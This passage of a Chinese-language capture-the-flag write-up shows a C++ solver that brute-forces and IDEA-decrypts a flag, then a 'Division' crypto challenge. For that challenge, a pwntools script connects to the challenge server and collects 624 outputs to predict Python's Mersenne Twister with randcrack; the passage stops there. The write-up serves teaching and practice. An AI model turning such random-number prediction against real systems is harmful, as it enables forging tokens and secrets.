        <span class="token number">0x5D681B02</span><span class="token punctuation">,</span> <span class="token number">0x9DD277AE</span><span class="token punctuation">,</span> <span class="token number">0xBDBDF21D</span><span class="token punctuation">,</span> <span class="token number">0x7D079EB1</span><span class="token punctuation">,</span> <span class="token number">0xE7B82D06</span><span class="token punctuation">,</span> <span class="token number">0x270241AA</span><span class="token punctuation">,</span> <span class="token number">0x09B64C2B</span><span class="token punctuation">,</span> <span class="token number">0xC90C2087</span><span class="token punctuation">,</span>
        <span class="token number">0x53B39330</span><span class="token punctuation">,</span> <span class="token number">0x9309FF9C</span><span class="token punctuation">,</span> <span class="token number">0x0EDB8832</span><span class="token punctuation">,</span> <span class="token number">0xCE61E49E</span><span class="token punctuation">,</span> <span class="token number">0x54DE5729</span><span class="token punctuation">,</span> <span class="token number">0x94643B85</span><span class="token punctuation">,</span> <span class="token number">0xBAD03604</span><span class="token punctuation">,</span> <span class="token number">0x7A6A5AA8</span><span class="token punctuation">,</span>
        <span class="token number">0xE0D5E91F</span><span class="token punctuation">,</span> <span class="token number">0x206F85B3</span><span class="token punctuation">,</span> <span class="token number">0xA00AE279</span><span class="token punctuation">,</span> <span class="token number">0x60B08ED5</span><span class="token punctuation">,</span> <span class="token number">0xFA0F3D62</span><span class="token punctuation">,</span> <span class="token number">0x3AB551CE</span><span class="token punctuation">,</span> <span class="token number">0x14015C4F</span><span class="token punctuation">,</span> <span class="token number">0xD4BB30E3</span><span class="token punctuation">,</span>
        <span class="token number">0x4E048354</span><span class="token punctuation">,</span> <span class="token number">0x8EBEEFF8</span><span class="token punctuation">,</span> <span class="token number">0x136C9856</span><span class="token punctuation">,</span> <span class="token number">0xD3D6F4FA</span><span class="token punctuation">,</span> <span class="token number">0x4969474D</span><span class="token punctuation">,</span> <span class="token number">0x89D32BE1</span><span class="token punctuation">,</span> <span class="token number">0xA7672660</span><span class="token punctuation">,</span> <span class="token number">0x67DD4ACC</span><span class="token punctuation">,</span>
        <span class="token number">0xFD62F97B</span><span class="token punctuation">,</span> <span class="token number">0x3DD895D7</span><span class="token punctuation">,</span> <span class="token number">0x1DB71064</span><span class="token punctuation">,</span> <span class="token number">0xDD0D7CC8</span><span class="token punctuation">,</span> <span class="token number">0x47B2CF7F</span><span class="token punctuation">,</span> <span class="token number">0x8708A3D3</span><span class="token punctuation">,</span> <span class="token number">0xA9BCAE52</span><span class="token punctuation">,</span> <span class="token number">0x6906C2FE</span><span class="token punctuation">,</span>
        <span class="token number">0xF3B97149</span><span class="token punctuation">,</span> <span class="token number">0x33031DE5</span><span class="token punctuation">,</span> <span class="token number">0xAED16A4B</span><span class="token punctuation">,</span> <span class="token number">0x6E6B06E7</span><span class="token punctuation">,</span> <span class="token number">0xF4D4B550</span><span class="token punctuation">,</span> <span class="token number">0x346ED9FC</span><span class="token punctuation">,</span> <span class="token number">0x1ADAD47D</span><span class="token punctuation">,</span> <span class="token number">0xDA60B8D1</span><span class="token punctuation">,</span>
        <span class="token number">0x40DF0B66</span><span class="token punctuation">,</span> <span class="token number">0x806567CA</span><span class="token punctuation">,</span> <span class="token number">0x9B64C2B1</span><span class="token punctuation">,</span> <span class="token number">0x5BDEAE1D</span><span class="token punctuation">,</span> <span class="token number">0xC1611DAA</span><span class="token punctuation">,</span> <span class="token number">0x01DB7106</span><span class="token punctuation">,</span> <span class="token number">0x2F6F7C87</span><span class="token punctuation">,</span> <span class="token number">0xEFD5102B</span><span class="token punctuation">,</span>
        <span class="token number">0x756AA39C</span><span class="token punctuation">,</span> <span class="token number">0xB5D0CF30</span><span class="token punctuation">,</span> <span class="token number">0x2802B89E</span><span class="token punctuation">,</span> <span class="token number">0xE8B8D432</span><span class="token punctuation">,</span> <span class="token number">0x72076785</span><span class="token punctuation">,</span> <span class="token number">0xB2BD0B29</span><span class="token punctuation">,</span> <span class="token number">0x9C0906A8</span><span class="token punctuation">,</span> <span class="token number">0x5CB36A04</span><span class="token punctuation">,</span>
        <span class="token number">0xC60CD9B3</span><span class="token punctuation">,</span> <span class="token number">0x06B6B51F</span><span class="token punctuation">,</span> <span class="token number">0x26D930AC</span><span class="token punctuation">,</span> <span class="token number">0xE6635C00</span><span class="token punctuation">,</span> <span class="token number">0x7CDCEFB7</span><span class="token punctuation">,</span> <span class="token number">0xBC66831B</span><span class="token punctuation">,</span> <span class="token number">0x92D28E9A</span><span class="token punctuation">,</span> <span class="token number">0x5268E236</span><span class="token punctuation">,</span>
        <span class="token number">0xC8D75181</span><span class="token punctuation">,</span> <span class="token number">0x086D3D2D</span><span class="token punctuation">,</span> <span class="token number">0x95BF4A83</span><span class="token punctuation">,</span> <span class="token number">0x5505262F</span><span class="token punctuation">,</span> <span class="token number">0xCFBA9598</span><span class="token punctuation">,</span> <span class="token number">0x0F00F934</span><span class="token punctuation">,</span> <span class="token number">0x21B4F4B5</span><span class="token punctuation">,</span> <span class="token number">0xE10E9819</span><span class="token punctuation">,</span>
        <span class="token number">0x7BB12BAE</span><span class="token punctuation">,</span> <span class="token number">0xBB0B4702</span><span class="token punctuation">,</span> <span class="token number">0x3B6E20C8</span><span class="token punctuation">,</span> <span class="token number">0xFBD44C64</span><span class="token punctuation">,</span> <span class="token number">0x616BFFD3</span><span class="token punctuation">,</span> <span class="token number">0xA1D1937F</span><span class="token punctuation">,</span> <span class="token number">0x8F659EFE</span><span class="token punctuation">,</span> <span class="token number">0x4FDFF252</span><span class="token punctuation">,</span>
        <span class="token number">0xD56041E5</span><span class="token punctuation">,</span> <span class="token number">0x15DA2D49</span><span class="token punctuation">,</span> <span class="token number">0x88085AE7</span><span class="token punctuation">,</span> <span class="token number">0x48B2364B</span><span class="token punctuation">,</span> <span class="token number">0xD20D85FC</span><span class="token punctuation">,</span> <span class="token number">0x12B7E950</span><span class="token punctuation">,</span> <span class="token number">0x3C03E4D1</span><span class="token punctuation">,</span> <span class="token number">0xFCB9887D</span><span class="token punctuation">,</span>
        <span class="token number">0x66063BCA</span><span class="token punctuation">,</span> <span class="token number">0xA6BC5766</span><span class="token punctuation">,</span> <span class="token number">0x86D3D2D5</span><span class="token punctuation">,</span> <span class="token number">0x4669BE79</span><span class="token punctuation">,</span> <span class="token number">0xDCD60DCE</span><span class="token punctuation">,</span> <span class="token number">0x1C6C6162</span><span class="token punctuation">,</span> <span class="token number">0x32D86CE3</span><span class="token punctuation">,</span> <span class="token number">0xF262004F</span><span class="token punctuation">,</span>
        <span class="token number">0x68DDB3F8</span><span class="token punctuation">,</span> <span class="token number">0xA867DF54</span><span class="token punctuation">,</span> <span class="token number">0x35B5A8FA</span><span class="token punctuation">,</span> <span class="token number">0xF50FC456</span><span class="token punctuation">,</span> <span class="token number">0x6FB077E1</span><span class="token punctuation">,</span> <span class="token number">0xAF0A1B4D</span><span class="token punctuation">,</span> <span class="token number">0x81BE16CC</span><span class="token punctuation">,</span> <span class="token number">0x41047A60</span><span class="token punctuation">,</span>
        <span class="token number">0xDBBBC9D7</span><span class="token punctuation">,</span> <span class="token number">0x1B01A57B</span><span class="token punctuation">,</span> <span class="token number">0xEDB88321</span><span class="token punctuation">,</span> <span class="token number">0x2D02EF8D</span><span class="token punctuation">,</span> <span class="token number">0xB7BD5C3A</span><span class="token punctuation">,</span> <span class="token number">0x77073096</span><span class="token punctuation">,</span> <span class="token number">0x59B33D17</span><span class="token punctuation">,</span> <span class="token number">0x990951BB</span><span class="token punctuation">,</span>
        <span class="token number">0x03B6E20C</span><span class="token punctuation">,</span> <span class="token number">0xC30C8EA0</span><span class="token punctuation">,</span> <span class="token number">0x5EDEF90E</span><span class="token punctuation">,</span> <span class="token number">0x9E6495A2</span><span class="token punctuation">,</span> <span class="token number">0x04DB2615</span><span class="token punctuation">,</span> <span class="token number">0xC4614AB9</span><span class="token punctuation">,</span> <span class="token number">0xEAD54738</span><span class="token punctuation">,</span> <span class="token number">0x2A6F2B94</span><span class="token punctuation">,</span>
        <span class="token number">0xB0D09823</span><span class="token punctuation">,</span> <span class="token number">0x706AF48F</span><span class="token punctuation">,</span> <span class="token number">0x5005713C</span><span class="token punctuation">,</span> <span class="token number">0x90BF1D90</span><span class="token punctuation">,</span> <span class="token number">0x0A00AE27</span><span class="token punctuation">,</span> <span class="token number">0xCABAC28B</span><span class="token punctuation">,</span> <span class="token number">0xE40ECF0A</span><span class="token punctuation">,</span> <span class="token number">0x24B4A3A6</span><span class="token punctuation">,</span>
        <span class="token number">0xBE0B1011</span><span class="token punctuation">,</span> <span class="token number">0x7EB17CBD</span><span class="token punctuation">,</span> <span class="token number">0xE3630B13</span><span class="token punctuation">,</span> <span class="token number">0x23D967BF</span><span class="token punctuation">,</span> <span class="token number">0xB966D408</span><span class="token punctuation">,</span> <span class="token number">0x79DCB8A4</span><span class="token punctuation">,</span> <span class="token number">0x5768B525</span><span class="token punctuation">,</span> <span class="token number">0x97D2D989</span><span class="token punctuation">,</span>
        <span class="token number">0x0D6D6A3E</span><span class="token punctuation">,</span> <span class="token number">0xCDD70692</span><span class="token punctuation">,</span> <span class="token number">0x4DB26158</span><span class="token punctuation">,</span> <span class="token number">0x8D080DF4</span><span class="token punctuation">,</span> <span class="token number">0x17B7BE43</span><span class="token punctuation">,</span> <span class="token number">0xD70DD2EF</span><span class="token punctuation">,</span> <span class="token number">0xF9B9DF6E</span><span class="token punctuation">,</span> <span class="token number">0x3903B3C2</span><span class="token punctuation">,</span>
        <span class="token number">0xA3BC0075</span><span class="token punctuation">,</span> <span class="token number">0x63066CD9</span><span class="token punctuation">,</span> <span class="token number">0xFED41B77</span><span class="token punctuation">,</span> <span class="token number">0x3E6E77DB</span><span class="token punctuation">,</span> <span class="token number">0xA4D1C46C</span><span class="token punctuation">,</span> <span class="token number">0x646BA8C0</span><span class="token punctuation">,</span> <span class="token number">0x4ADFA541</span><span class="token punctuation">,</span> <span class="token number">0x8A65C9ED</span><span class="token punctuation">,</span>
        <span class="token number">0x10DA7A5A</span><span class="token punctuation">,</span> <span class="token number">0xD06016F6</span><span class="token punctuation">,</span> <span class="token number">0xF00F9345</span><span class="token punctuation">,</span> <span class="token number">0x30B5FFE9</span><span class="token punctuation">,</span> <span class="token number">0xAA0A4C5E</span><span class="token punctuation">,</span> <span class="token number">0x6AB020F2</span><span class="token punctuation">,</span> <span class="token number">0x44042D73</span><span class="token punctuation">,</span> <span class="token number">0x84BE41DF</span><span class="token punctuation">,</span>
        <span class="token number">0x1E01F268</span><span class="token punctuation">,</span> <span class="token number">0xDEBB9EC4</span><span class="token punctuation">,</span> <span class="token number">0x4369E96A</span><span class="token punctuation">,</span> <span class="token number">0x83D385C6</span><span class="token punctuation">,</span> <span class="token number">0x196C3671</span><span class="token punctuation">,</span> <span class="token number">0xD9D65ADD</span><span class="token punctuation">,</span> <span class="token number">0xF762575C</span><span class="token punctuation">,</span> <span class="token number">0x37D83BF0</span><span class="token punctuation">,</span>
        <span class="token number">0xAD678847</span><span class="token punctuation">,</span> <span class="token number">0x6DDDE4EB</span><span class="token punctuation">,</span> <span class="token number">0x76DC4190</span><span class="token punctuation">,</span> <span class="token number">0xB6662D3C</span><span class="token punctuation">,</span> <span class="token number">0x2CD99E8B</span><span class="token punctuation">,</span> <span class="token number">0xEC63F227</span><span class="token punctuation">,</span> <span class="token number">0xC2D7FFA6</span><span class="token punctuation">,</span> <span class="token number">0x026D930A</span><span class="token punctuation">,</span>
        <span class="token number">0x98D220BD</span><span class="token punctuation">,</span> <span class="token number">0x58684C11</span><span class="token punctuation">,</span> <span class="token number">0xC5BA3BBF</span><span class="token punctuation">,</span> <span class="token number">0x05005713</span><span class="token punctuation">,</span> <span class="token number">0x9FBFE4A4</span><span class="token punctuation">,</span> <span class="token number">0x5F058808</span><span class="token punctuation">,</span> <span class="token number">0x71B18589</span><span class="token punctuation">,</span> <span class="token number">0xB10BE925</span><span class="token punctuation">,</span>
        <span class="token number">0x2BB45A92</span><span class="token punctuation">,</span> <span class="token number">0xEB0E363E</span><span class="token punctuation">,</span> <span class="token number">0xCB61B38D</span><span class="token punctuation">,</span> <span class="token number">0x0BDBDF21</span><span class="token punctuation">,</span> <span class="token number">0x91646C96</span><span class="token punctuation">,</span> <span class="token number">0x51DE003A</span><span class="token punctuation">,</span> <span class="token number">0x7F6A0DBB</span><span class="token punctuation">,</span> <span class="token number">0xBFD06117</span><span class="token punctuation">,</span>
        <span class="token number">0x256FD2A0</span><span class="token punctuation">,</span> <span class="token number">0xE5D5BE0C</span><span class="token punctuation">,</span> <span class="token number">0x7807C9A2</span><span class="token punctuation">,</span> <span class="token number">0xB8BDA50E</span><span class="token punctuation">,</span> <span class="token number">0x220216B9</span><span class="token punctuation">,</span> <span class="token number">0xE2B87A15</span><span class="token punctuation">,</span> <span class="token number">0xCC0C7794</span><span class="token punctuation">,</span> <span class="token number">0x0CB61B38</span><span class="token punctuation">,</span>
        <span class="token number">0x9609A88F</span><span class="token punctuation">,</span> <span class="token number">0x56B3C423</span><span class="token punctuation">,</span> <span class="token number">0xD6D6A3E9</span><span class="token punctuation">,</span> <span class="token number">0x166CCF45</span><span class="token punctuation">,</span> <span class="token number">0x8CD37CF2</span><span class="token punctuation">,</span> <span class="token number">0x4C69105E</span><span class="token punctuation">,</span> <span class="token number">0x62DD1DDF</span><span class="token punctuation">,</span> <span class="token number">0xA2677173</span><span class="token punctuation">,</span>
        <span class="token number">0x38D8C2C4</span><span class="token punctuation">,</span> <span class="token number">0xF862AE68</span><span class="token punctuation">,</span> <span class="token number">0x65B0D9C6</span><span class="token punctuation">,</span> <span class="token number">0xA50AB56A</span><span class="token punctuation">,</span> <span class="token number">0x3FB506DD</span><span class="token punctuation">,</span> <span class="token number">0xFF0F6A71</span><span class="token punctuation">,</span> <span class="token number">0xD1BB67F0</span><span class="token punctuation">,</span> <span class="token number">0x11010B5C</span><span class="token punctuation">,</span>
        <span class="token number">0x8BBEB8EB</span><span class="token punctuation">,</span> <span class="token number">0x4B04D447</span><span class="token punctuation">,</span> <span class="token number">0x6B6B51F4</span><span class="token punctuation">,</span> <span class="token number">0xABD13D58</span><span class="token punctuation">,</span> <span class="token number">0x316E8EEF</span><span class="token punctuation">,</span> <span class="token number">0xF1D4E243</span><span class="token punctuation">,</span> <span class="token number">0xDF60EFC2</span><span class="token punctuation">,</span> <span class="token number">0x1FDA836E</span><span class="token punctuation">,</span>
        <span class="token number">0x856530D9</span><span class="token punctuation">,</span> <span class="token number">0x45DF5C75</span><span class="token punctuation">,</span> <span class="token number">0xD80D2BDB</span><span class="token punctuation">,</span> <span class="token number">0x18B74777</span><span class="token punctuation">,</span> <span class="token number">0x8208F4C0</span><span class="token punctuation">,</span> <span class="token number">0x42B2986C</span><span class="token punctuation">,</span> <span class="token number">0x6C0695ED</span><span class="token punctuation">,</span> <span class="token number">0xACBCF941</span><span class="token punctuation">,</span>
        <span class="token number">0x36034AF6</span><span class="token punctuation">,</span> <span class="token number">0xF6B9265A</span><span class="token punctuation">,</span> <span class="token number">0xCCCCCCCC</span><span class="token punctuation">,</span> <span class="token number">0xCCCCCC00</span><span class="token punctuation">,</span> <span class="token number">0x00000100</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0xF6B9265A</span><span class="token punctuation">,</span> <span class="token number">0xCCCCCCCC</span><span class="token punctuation">,</span>
        <span class="token number">0x00000008</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

    <span class="token keyword">uint32_t</span> enc1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
        <span class="token number">0x46A95BAD</span><span class="token punctuation">,</span>
        <span class="token number">0x1CAC84B6</span><span class="token punctuation">,</span>
        <span class="token number">0xA67CB2B2</span><span class="token punctuation">,</span>
        <span class="token number">0x32188937</span><span class="token punctuation">,</span>
        <span class="token number">0x4872D39F</span><span class="token punctuation">,</span>
        <span class="token number">0xF2A2E59B</span><span class="token punctuation">,</span>
        <span class="token number">0x011B94D2</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

    <span class="token comment">// 爆破前7字节</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">7</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">28</span><span class="token punctuation">;</span> c <span class="token operator">&lt;</span> <span class="token number">132</span><span class="token punctuation">;</span> c<span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>box1<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">uint8_t</span><span class="token punctuation">)</span>c <span class="token operator">^</span> <span class="token number">0x79</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0xB0E0E879</span><span class="token punctuation">)</span> <span class="token operator">==</span> enc1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#123;</span>
                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// 后16字节进行IDEA解密</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> enc2<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token number">0x5C</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0xD0</span><span class="token punctuation">,</span> <span class="token number">0xEC</span><span class="token punctuation">,</span> <span class="token number">0x82</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span>
        <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0x9F</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0xF6</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0xA4</span><span class="token punctuation">,</span> <span class="token number">0xAC</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token comment">// unsigned int key[4] = &#123;</span>
    <span class="token comment">//     0x42B2986C, 0x12345678, 0x0D6D6A3E, 0x89ABCDEF&#125;;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> key<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token number">0x6C98B242</span><span class="token punctuation">,</span> <span class="token number">0x78563412</span><span class="token punctuation">,</span> <span class="token number">0x3E6A6D0D</span><span class="token punctuation">,</span> <span class="token number">0xEFCDAB89</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

    code keys_input<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        keys_input<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFF</span><span class="token punctuation">;</span>
        keys_input<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFF</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> result<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    bitset<span class="token operator">&lt;</span><span class="token number">64</span><span class="token operator">></span> cipher1<span class="token punctuation">,</span> cipher2<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token generic-function"><span class="token function">i</span> <span class="token generic class-name"><span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            cipher1<span class="token punctuation">[</span><span class="token number">63</span> <span class="token operator">-</span> <span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>enc2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>></span></span></span> <span class="token punctuation">(</span><span class="token number">7</span> <span class="token operator">-</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">;</span>
            cipher2<span class="token punctuation">[</span><span class="token number">63</span> <span class="token operator">-</span> <span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>enc2<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token punctuation">(</span><span class="token number">7</span> <span class="token operator">-</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">subkeys_get</span><span class="token punctuation">(</span>keys_input<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">inv_subkeys_get</span><span class="token punctuation">(</span>sub_key<span class="token punctuation">)</span><span class="token punctuation">;</span>

    bitset<span class="token operator">&lt;</span><span class="token number">64</span><span class="token operator">></span> plain1 <span class="token operator">=</span> <span class="token function">dencrypt</span><span class="token punctuation">(</span>cipher1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    bitset<span class="token operator">&lt;</span><span class="token number">64</span><span class="token operator">></span> plain2 <span class="token operator">=</span> <span class="token function">dencrypt</span><span class="token punctuation">(</span>cipher2<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">uint64_t</span> plain1_val <span class="token operator">=</span> plain1<span class="token punctuation">.</span><span class="token function">to_ullong</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">uint64_t</span> plain2_val <span class="token operator">=</span> plain2<span class="token punctuation">.</span><span class="token function">to_ullong</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">uint8_t</span> dec2<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>dec2<span class="token punctuation">,</span> <span class="token operator">&amp;</span>plain2_val<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>dec2 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>plain1_val<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">reverse</span><span class="token punctuation">(</span>dec2<span class="token punctuation">,</span> dec2 <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%.16s\n"</span><span class="token punctuation">,</span> dec2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>flag{moshui_build_this_block}</p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Division"><a href="#Division" class="headerlink" title="Division"></a>Division</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    choose <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">': >>> '</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> choose <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            denominator <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'input the denominator: >>> '</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'INPUT NUMBERS'</span><span class="token punctuation">)</span>
            <span class="token keyword">continue</span>
        nominator <span class="token operator">=</span> random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> denominator <span class="token operator">==</span> <span class="token string">'0'</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'NO YOU DONT'</span><span class="token punctuation">)</span>
            <span class="token keyword">continue</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>nominator<span class="token punctuation">&#125;</span></span><span class="token string">//</span><span class="token interpolation"><span class="token punctuation">&#123;</span>denominator<span class="token punctuation">&#125;</span></span><span class="token string"> = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>nominator<span class="token operator">//</span>denominator<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
</code></pre>

<p>题目可以任意获取32字节的数据，直接使用现有的mt19937攻击库即可预测随机数</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> randcrack <span class="token keyword">import</span> RandCrack
<span class="token keyword">from</span> tqdm <span class="token keyword">import</span> tqdm

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"47.94.217.82"</span><span class="token punctuation">,</span><span class="token number">28739</span> <span class="token punctuation">)</span>
data<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'>>> '</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'1'</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'tor: >>> '</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'1'</span><span class="token punctuation">)</span>
    line<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>line<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>


RC <span class="token operator">=</span> RandCrack<span class="token punctuation">(</span><span class="token punctuation">)</span>
